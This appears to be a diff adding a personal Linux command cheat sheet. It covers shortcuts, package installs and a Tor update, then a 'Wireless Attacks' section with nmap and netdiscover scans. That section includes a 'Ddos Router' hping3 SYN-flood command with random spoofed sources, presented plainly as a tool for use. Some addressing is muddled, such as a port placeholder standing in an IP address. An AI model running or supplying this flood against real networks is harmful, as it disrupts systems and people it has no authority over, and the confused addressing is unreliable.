@@ -1,0 +1,28 @@
+Commands:
+
+ctrl + shift + C (copy)
+ctrl + shift + V (paste)
+ctrl + u (clear current line)
+
+sudo -i (login as sudo)
+apt (for installations)
+git clone <link...> (copies a git Repro)
+python3 <file_name> (run python script)
+
+
+
+
+
+update TOR -> "apt-get update && apt-get install tor deb.torproject.org-keyring"
+reset gnome -> dconf reset -f /org/gnome/ 
+
+
+
+------------------------------ Wireless Attacks ---------------------------
+ping a IP:		ping 255.255.255.???
+get Brodcast:		ifconfig wlan0
+get Wlan info:		iwconfig wlan0
+Nmap Wlan: 		sudo nmap -sn 255.255.255.0/24
+NetDiscover Wlan:	sudo netdiscover -i wlan0 -c 3 -r 255.255.255.0/24
+Ddos Router:  		sudo hping3 -d 120 -S -w 64 -p 80 --flood --rand-source 255.255.255.<port> (Router-Port: 1)
+
